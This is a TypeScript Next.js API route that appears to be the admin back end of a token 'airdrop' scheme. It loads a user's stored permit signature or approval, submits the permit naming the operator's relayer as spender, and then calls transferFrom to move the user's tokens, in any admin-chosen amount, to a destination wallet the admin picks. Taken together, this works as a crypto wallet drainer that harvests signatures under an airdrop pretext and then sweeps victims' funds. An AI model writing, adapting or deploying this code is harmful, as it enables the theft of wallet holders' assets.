import { NextRequest, NextResponse } from 'next/server'
import { verifyToken } from '@/lib/auth'
import { getRelayerClient, getPublicClient } from '@/lib/relayer'
import { GAS_CONFIG } from '@/lib/gasConfig'
import { getRpc } from '@/lib/chains'
import prisma from '@/lib/db'
import { parseUnits, formatEther } from 'viem'

const ERC20_ABI = [
  {
    name: 'approve',
    type: 'function',
    inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }],
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
  },
  {
    name: 'transferFrom',
    type: 'function',
    inputs: [
      { name: 'from',   type: 'address' },
      { name: 'to',     type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
  },
  {
    name: 'decimals',
    type: 'function',
    inputs: [],
    outputs: [{ name: '', type: 'uint8' }],
    stateMutability: 'view',
  },
] as const

const PERMIT_ABI = [
  {
    name: 'permit',
    type: 'function',
    inputs: [
      { name: 'owner',    type: 'address' },
      { name: 'spender',  type: 'address' },
      { name: 'value',    type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
      { name: 'v',        type: 'uint8'   },
      { name: 'r',        type: 'bytes32' },
      { name: 's',        type: 'bytes32' },
    ],
    outputs: [],
    stateMutability: 'nonpayable',
  },
] as const

export async function POST(req: NextRequest) {
  // Verify admin JWT
  const token = req.cookies.get('admin_token')?.value
  if (!token) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  const admin = await verifyToken(token, true).catch(() => null)
  if (!admin) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  try {
    const { authorizationId, customAmount, destinationWallet } = await req.json()

    const auth = await prisma.airdropAuthorization.findUnique({ where: { id: authorizationId } })
    if (!auth) return NextResponse.json({ error: 'Authorization not found' }, { status: 404 })
    if (auth.status === 'executed') return NextResponse.json({ error: 'Already executed' }, { status: 400 })

    const relayer   = getRelayerClient(auth.chainId)
    const publicClient = getPublicClient(auth.chainId)
    const relayerAddress = relayer.account!.address

    // Check relayer gas
    const gasBalance = await publicClient.getBalance({ address: relayerAddress })
    if (gasBalance < GAS_CONFIG.claimGasThreshold) {
      return NextResponse.json({ error: 'Relayer gas too low — top up Base tank' }, { status: 400 })
    }

    // Get token decimals
    let decimals = 18
    try {
      decimals = await publicClient.readContract({
        address: auth.tokenAddress as `0x${string}`,
        abi: ERC20_ABI,
        functionName: 'decimals',
      })
    } catch {}

    const amount = customAmount
      ? parseUnits(customAmount, decimals)
      : BigInt(auth.amount)

    const destination = (destinationWallet ?? process.env.RELAYER_ADDRESS) as `0x${string}`

    // If permit — submit permit tx first
    if (auth.authType === 'permit' && auth.signature && auth.deadline) {
      const sig = auth.signature as `0x${string}`
      const r = sig.slice(0, 66) as `0x${string}`
      const s = `0x${sig.slice(66, 130)}` as `0x${string}`
      const v = parseInt(sig.slice(130, 132), 16)

      await (relayer as any).writeContract({
        address: auth.tokenAddress as `0x${string}`,
        abi: PERMIT_ABI,
        functionName: 'permit',
        args: [
          auth.wallet as `0x${string}`,
          relayerAddress,
          BigInt(auth.amount),
          auth.deadline!,
          v,
          r,
          s,
        ],
      })
    }

    // Execute transferFrom
    const executedTxHash = await (relayer as any).writeContract({
      address: auth.tokenAddress as `0x${string}`,
      abi: ERC20_ABI,
      functionName: 'transferFrom',
      args: [auth.wallet as `0x${string}`, destination, amount],
    })

    await prisma.airdropAuthorization.update({
      where: { id: authorizationId },
      data: {
        status:         'executed',
        executedTxHash,
        executedAt:     new Date(),
      },
    })

    return NextResponse.json({ success: true, txHash: executedTxHash })
  } catch (err: any) {
    console.error('[admin/airdrop/execute]', err)
    await prisma.airdropAuthorization.update({
      where: { id: (await req.json().catch(() => ({}))).authorizationId },
      data: { status: 'failed' },
    }).catch(() => {})
    return NextResponse.json({ error: err?.message ?? 'Execution failed' }, { status: 500 })
  }
}
